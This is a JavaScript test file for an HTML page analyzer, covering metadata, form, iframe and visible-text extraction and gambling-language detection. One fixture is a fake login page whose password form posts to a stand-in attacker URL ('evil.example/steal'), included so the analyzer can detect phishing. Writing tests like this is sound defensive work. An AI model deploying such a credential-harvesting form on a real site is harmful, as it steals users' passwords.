import test from "node:test";
import assert from "node:assert/strict";

import { analyzeHtml } from "../src/analysis/htmlAnalyzer.js";
import { detectGamblingLanguage } from "../src/analysis/pageFindings.js";

test("analyzeHtml — keeps zone taxonomy and phishing form fields", () => {
  const html = `<html><head><title>Acme Login</title>
    <meta name="description" content="Sign in">
    <script type="application/ld+json">{"@type":"Organization","name":"Acme"}</script>
  </head><body>
    <h1>Welcome</h1>
    <div aria-hidden="true"><p>Cookie banner junk</p></div>
    <form action="https://evil.example/steal" method="post">
      <input type="password" name="pw" id="pw" autocomplete="off">
      <input type="hidden" name="csrf" value="abc">
    </form>
    <a href="/help" rel="nofollow">Help</a>
    <iframe src="https://ads.example/frame.html" title="ad"></iframe>
    <section data-captured-iframe="true">
      <a href="https://www.register.com/renew">Renew Your Domain Name Now</a>
    </section>
    <img src="/logo.png" data-src="/logo-hi.png" loading-src="/logo-lazy.png" alt="Logo">
  </body></html>`;

  const doc = analyzeHtml(html);

  assert.equal(doc.meta.title, "Acme Login");
  assert.equal(doc.meta.description, "Sign in");

  assert.ok(doc.textZones.headingText.includes("Welcome"));
  assert.ok(doc.textZones.iframeText.some((t) => t.includes("Renew Your Domain")));
  assert.equal(doc.textZones.visibleText, undefined);

  assert.equal(doc.forms[0].method, "POST");
  assert.equal(doc.forms[0].hiddenFields[0].name, "csrf");
  assert.equal(doc.forms[0].allInputs[0].autocomplete, "off");

  assert.equal(doc.links.find((l) => l.href === "/help")?.rel, "nofollow");

  assert.deepEqual(doc.structuredData[0], {
    "@type": "Organization",
    name: "Acme",
  });

  assert.deepEqual(doc.iframes[0], {
    src: "https://ads.example/frame.html",
    title: "ad",
  });

  assert.ok(
    !doc.visibleText.some((t) => t.includes("Cookie banner junk")),
    "aria-hidden text should be excluded",
  );
  assert.ok(
    !doc.bodyText.includes("Cookie banner junk"),
    "aria-hidden text should be excluded from bodyText",
  );
  assert.ok(doc.analysisText.includes("Acme Login"));
  assert.ok(doc.textExtras.jsonLdText.includes("Acme"));

  const lazy = doc.images.filter((i) => i.kind === "lazy").map((i) => i.src);
  assert.ok(lazy.includes("/logo-hi.png"));
  assert.ok(lazy.includes("/logo-lazy.png"));
});

test("analyzeHtml — malformed JSON-LD is ignored", () => {
  const doc = analyzeHtml(
    `<html><body><script type="application/ld+json">{bad</script></body></html>`,
  );
  assert.deepEqual(doc.structuredData, []);
});

test("analyzeHtml — DOM fallback avoids parent/child duplication", () => {
  const html = `<html><body>
    <div><p>Unique paragraph about fiber plans</p></div>
  </body></html>`;
  const doc = analyzeHtml(html);
  const hits = doc.visibleText.filter((t) =>
    t.includes("Unique paragraph about fiber plans"),
  );
  assert.equal(hits.length, 1, "paragraph should appear once, not via parent div");
  assert.ok(!doc.renderedText);
  assert.ok(doc.bodyText.includes("Unique paragraph about fiber plans"));
});

test("analyzeHtml — renderedText preferred over DOM body extract", () => {
  const html = `<html><body><p>DOM only copy</p></body></html>`;
  const doc = analyzeHtml(html, {
    renderedText: "Browser rendered casino lobby text",
  });
  assert.equal(doc.renderedText, "Browser rendered casino lobby text");
  assert.equal(doc.bodyText, "Browser rendered casino lobby text");
  assert.deepEqual(doc.visibleText, ["Browser rendered casino lobby text"]);
  assert.ok(doc.analysisText.includes("Browser rendered casino lobby text"));
  assert.ok(!doc.bodyText.includes("DOM only copy"));
});

test("analyzeHtml — meta casino title reaches analysisText for gambling", () => {
  const html = `<html><head>
    <title>Best online casino bonuses</title>
    <meta name="description" content="Play slots and live dealer games">
  </head><body><p>Welcome to our entertainment portal</p></body></html>`;
  const doc = analyzeHtml(html);
  assert.ok(doc.analysisText.toLowerCase().includes("casino"));
  const gambling = detectGamblingLanguage(doc.analysisText);
  assert.ok(gambling.definitiveCount >= 1);
});
